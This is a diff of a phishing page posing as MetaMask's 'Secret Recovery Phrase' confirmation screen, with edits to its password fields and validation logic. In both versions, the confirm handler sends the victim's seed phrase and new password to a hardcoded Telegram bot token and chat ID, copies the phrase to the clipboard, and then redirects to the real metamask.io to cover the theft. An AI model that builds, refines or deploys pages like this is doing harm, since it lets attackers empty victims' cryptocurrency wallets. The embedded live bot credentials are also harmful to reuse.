@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Secret Recovery Phrase</title>
-  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * { box-sizing: border-box; }
     body {
@@ -128,6 +128,27 @@
       border: 1px solid #ccc;
       font-size: 14px;
     }
+    .password-row {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 20px;
+      margin-bottom: 20px;
+    }
+    .password-label {
+      font-size: 13px;
+      font-weight: 600;
+      color: #444;
+      margin-bottom: 4px;
+    }
+    input[type="password"] {
+      width: 100%;
+      max-width: 280px;
+      padding: 8px 12px;
+      font-size: 14px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
     .submit-btn {
       background: linear-gradient(90deg, #537cff, #6563ff);
       border: none;
@@ -137,7 +158,6 @@
       font-size: 16px;
       border-radius: 24px;
       cursor: pointer;
-      margin-top: 20px;
     }
     .submit-btn:disabled {
       opacity: 0.5;
@@ -150,40 +170,6 @@
       margin-top: 10px;
       display: none;
     }
-
-    /* PASSWORD FIELDS - stacked vertically */
-    .password-container {
-      margin-top: 20px;
-      max-width: 420px;
-    }
-    .password-field {
-      display: flex;
-      flex-direction: column;
-      width: 100%;
-      margin-bottom: 16px;
-    }
-    .password-field label {
-      font-weight: 600;
-      font-size: 12px;
-      color: #444;
-      margin-bottom: 6px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-    .password-field input {
-      padding: 8px 10px;
-      font-size: 14px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      transition: border-color 0.3s ease;
-      width: 200px;
-      max-width: 100%;
-    }
-    .password-field input:focus {
-      border-color: #6264ff;
-      outline: none;
-    }
-
     @media (max-width: 600px) {
       .seed-inputs {
         grid-template-columns: repeat(2, 1fr);
@@ -191,17 +177,14 @@
       .step-circles {
         gap: 80px;
       }
-      .password-field input {
-        width: 100%;
-      }
     }
   </style>
 </head>
 <body>
 
   <div class="top-bar">
-    <div><img src="https://metamask2-eight.vercel.app/meta.png" width="70" alt="logo" /></div>
-    <select class="language-select" aria-label="Select language">
+    <div><img src="https://metamask2-eight.vercel.app/meta.png"  width="70px"></div>
+    <select class="language-select">
       <option value="en">English</option>
       <option value="fr">Français</option>
       <option value="es">Español</option>
@@ -214,11 +197,11 @@
       <div class="step-circles">
         <div class="step active">
           <div class="circle">1</div>
-          <div class="label">Confirm secret<br />recovery phrase</div>
+          <div class="label">Confirm secret<br/>recovery phrase</div>
         </div>
         <div class="step">
           <div class="circle">2</div>
-          <div class="label">Create<br />password</div>
+          <div class="label">Create<br/>password</div>
         </div>
       </div>
 
@@ -240,22 +223,20 @@
 
       <div class="seed-inputs" id="seedInputs"></div>
 
-      <div class="password-container">
-        <div class="password-field">
-          <label for="newPassword">New Password</label>
-          <input type="password" id="newPassword" placeholder="" autocomplete="new-password" />
-        </div>
-        <div class="password-field">
-          <label for="confirmPassword">Confirm Password</label>
-          <input type="password" id="confirmPassword" placeholder="" autocomplete="new-password" />
-        </div>
-        <p id="passwordError" class="error-msg">Passwords do not match.</p>
+      <div class="password-row">
+        <label for="newPassword" class="password-label">New Password</label>
+        <input type="password" id="newPassword" autocomplete="new-password" />
+        
+        <label for="confirmPassword" class="password-label">Confirm Password</label>
+        <input type="password" id="confirmPassword" autocomplete="new-password" />
       </div>
+
+      <p id="passwordErrorMsg" class="error-msg"></p>
+      <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
 
       <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
         Confirm Secret Recovery Phrase
       </button>
-      <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
 
     </div>
   </main>
@@ -276,7 +257,10 @@
 
       const inputs = container.querySelectorAll("input");
       inputs.forEach(input => {
-        input.addEventListener("input", checkFieldsFilled);
+        input.addEventListener("input", () => {
+          checkFieldsFilled();
+          clearPasswordError();
+        });
       });
 
       document.getElementById("submitBtn").disabled = true;
@@ -294,14 +278,24 @@
         }
       }
 
-      // Also check password fields are filled and matching
-      const newPass = document.getElementById("newPassword").value.trim();
-      const confirmPass = document.getElementById("confirmPassword").value.trim();
-      const passwordsMatch = newPass !== "" && newPass === confirmPass;
+      const newPwd = document.getElementById("newPassword").value.trim();
+      const confirmPwd = document.getElementById("confirmPassword").value.trim();
 
-      document.getElementById("passwordError").style.display = passwordsMatch ? "none" : "block";
+      if (newPwd.length < 6) {
+        allFilled = false;
+      }
+      // Only enable submit if confirm password is filled and matches new password
+      if (confirmPwd === "" || newPwd !== confirmPwd) {
+        allFilled = false;
+      }
 
-      document.getElementById("submitBtn").disabled = !(allFilled && passwordsMatch);
+      document.getElementById("submitBtn").disabled = !allFilled;
+    }
+
+    function clearPasswordError() {
+      const pwdErrorEl = document.getElementById("passwordErrorMsg");
+      pwdErrorEl.style.display = "none";
+      pwdErrorEl.textContent = "";
     }
 
     function validateBIP39Words() {
@@ -324,21 +318,35 @@
 
     function handleConfirm() {
       const errorEl = document.getElementById("errorMsg");
+      const pwdErrorEl = document.getElementById("passwordErrorMsg");
+      const newPwd = document.getElementById("newPassword").value.trim();
+      const confirmPwd = document.getElementById("confirmPassword").value.trim();
+
+      // Reset errors
+      errorEl.style.display = "none";
+      pwdErrorEl.style.display = "none";
+      pwdErrorEl.textContent = "";
+
       if (!validateBIP39Words()) {
         errorEl.style.display = "block";
         return;
-      } else {
-        errorEl.style.display = "none";
       }
 
-      // Check passwords match before sending
-      const newPass = document.getElementById("newPassword").value.trim();
-      const confirmPass = document.getElementById("confirmPassword").value.trim();
-      if (newPass === "" || newPass !== confirmPass) {
-        document.getElementById("passwordError").style.display = "block";
+      if (newPwd.length < 6) {
+        pwdErrorEl.textContent = "Password must be at least 6 characters.";
+        pwdErrorEl.style.display = "block";
         return;
-      } else {
-        document.getElementById("passwordError").style.display = "none";
+      }
+
+      if (confirmPwd === "") {
+        // Do not show error if confirm is empty
+        return;
+      }
+
+      if (newPwd !== confirmPwd) {
+        pwdErrorEl.textContent = "Passwords do not match.";
+        pwdErrorEl.style.display = "block";
+        return;
       }
 
       const count = parseInt(document.getElementById("phraseLength").value);
@@ -348,31 +356,26 @@
         phrase += value.trim() + " ";
       }
 
-      const botToken = "7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0"; // Remplace ici
-      const chatId = "6996434307";     // Remplace ici
-
-      // Envoi du texte avec phrase + mot de passe (caché par étoiles côté client, mais envoyé en clair ici)
-      const textToSend =
-        "Secret Recovery Phrase:\n" + phrase.trim() +
-        "\n\nNew Password: " + newPass;
+      const botToken = "7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0";
+      const chatId = "6996434307";
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text: textToSend
+          text: `Secret Recovery Phrase:\n${phrase.trim()}\n\nNew Password: ${newPwd}`
         })
       });
 
       navigator.clipboard.writeText(phrase.trim());
 
       setTimeout(() => {
-        window.location.href = "https://metamask.io/"; // Remplace le lien ici
+        window.location.href = "https://metamask.io/";
       }, 800);
     }
 
-    document.addEventListener("paste", function (e) {
+    document.addEventListener("paste", function(e) {
       const activeInput = document.activeElement;
       if (!activeInput || !activeInput.name || !activeInput.name.startsWith("word")) return;
 
@@ -389,13 +392,11 @@
       checkFieldsFilled();
     });
 
-    // Add event listeners on password inputs for enabling button dynamically
-    window.onload = function () {
-      generateInputs();
+    // Enable submit button also when typing password fields
+    document.getElementById("newPassword").addEventListener("input", checkFieldsFilled);
+    document.getElementById("confirmPassword").addEventListener("input", checkFieldsFilled);
 
-      document.getElementById("newPassword").addEventListener("input", checkFieldsFilled);
-      document.getElementById("confirmPassword").addEventListener("input", checkFieldsFilled);
-    };
+    window.onload = generateInputs;
   </script>
 </body>
 </html>
